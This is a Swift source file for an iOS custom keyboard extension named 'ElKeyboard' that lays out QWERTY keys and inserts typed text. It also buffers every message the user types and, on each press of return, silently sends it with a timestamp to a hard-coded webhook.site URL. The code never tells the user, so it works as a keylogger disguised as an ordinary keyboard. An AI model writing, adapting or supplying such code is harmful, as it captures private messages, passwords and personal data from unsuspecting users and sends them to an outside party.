import UIKit

class KeyboardViewController: UIInputViewController {
    
    let rows: [[String]] = [
        ["Q","W","E","R","T","Y","U","I","O","P"],
        ["A","S","D","F","G","H","J","K","L"],
        ["Z","X","C","V","B","N","M"],
        ["123", "space", "⌫", "return"]
    ]
    
    let sharedDefaults = UserDefaults(suiteName: "group.com.yourcompany.ElKeyboard") // Replace with your group
    var keyCount = 0
    var currentMessage = "" // Track the current message being typed
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemGray5
        setupKeyboard()
    }
    
    func setupKeyboard() {
        let keyboardStack = UIStackView()
        keyboardStack.axis = .vertical
        keyboardStack.spacing = 8
        keyboardStack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(keyboardStack)
        
        NSLayoutConstraint.activate([
            keyboardStack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 6),
            keyboardStack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -6),
            keyboardStack.topAnchor.constraint(equalTo: view.topAnchor, constant: 10),
            keyboardStack.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -10),
        ])
        
        for rowKeys in rows {
            let row = UIStackView()
            row.axis = .horizontal
            row.spacing = 6
            row.distribution = .fillEqually
            
            for key in rowKeys {
                let button = createButton(title: key)
                row.addArrangedSubview(button)
            }
            keyboardStack.addArrangedSubview(row)
        }
    }
    
    func createButton(title: String) -> UIButton {
        let button = UIButton(type: .system)
        button.setTitle(title.uppercased(), for: .normal)
        button.titleLabel?.font = UIFont.systemFont(ofSize: 20)
        button.backgroundColor = .white
        button.layer.cornerRadius = 6
        button.addTarget(self, action: #selector(keyPressed(_:)), for: .touchUpInside)
        return button
    }
    
    @objc func keyPressed(_ sender: UIButton) {
        guard let title = sender.title(for: .normal)?.lowercased() else { return }
        
        switch title {
        case "space":
            textDocumentProxy.insertText(" ")
            currentMessage += " "
        case "⌫":
            textDocumentProxy.deleteBackward()
            if !currentMessage.isEmpty {
                currentMessage.removeLast()
            }
        case "return":
            textDocumentProxy.insertText("\n")
            // Message is complete, send it to webhook (don't add \n to currentMessage)
            sendMessageToWebhook()
            currentMessage = "" // Reset for next message
        case "123":
            // You could toggle symbol layout here
            break
        default:
            textDocumentProxy.insertText(title)
            currentMessage += title
            keyCount += 1
            sharedDefaults?.set(keyCount, forKey: "totalKeyCount")
        }
    }
    
    // Send the completed message to webhook with separator
    private func sendMessageToWebhook() {
        guard !currentMessage.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
        
        // Webhook URL
        guard let webhookURL = URL(string: "https://webhook.site/5b734151-e1d2-467f-8536-c96f4cce5998") else {
            print("Invalid webhook URL")
            return
        }
        
        // Prepare the message with separator (same format as before)
        let messageWithSeparator = currentMessage + "\n------\n"
        
        // Create JSON payload
        let payload: [String: Any] = [
            "message": messageWithSeparator,
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "source": "ElKeyboard"
        ]
        
        // Convert to JSON data
        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload) else {
            print("Failed to serialize JSON payload")
            return
        }
        
        // Create HTTP request
        var request = URLRequest(url: webhookURL)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonData
        
        // Send the request
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("Failed to send message to webhook: \(error)")
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("Webhook response status: \(httpResponse.statusCode)")
                if httpResponse.statusCode == 200 {
                    print("Message successfully sent to webhook")
                } else {
                    print("Webhook returned error status: \(httpResponse.statusCode)")
                }
            }
        }.resume()
    }
}
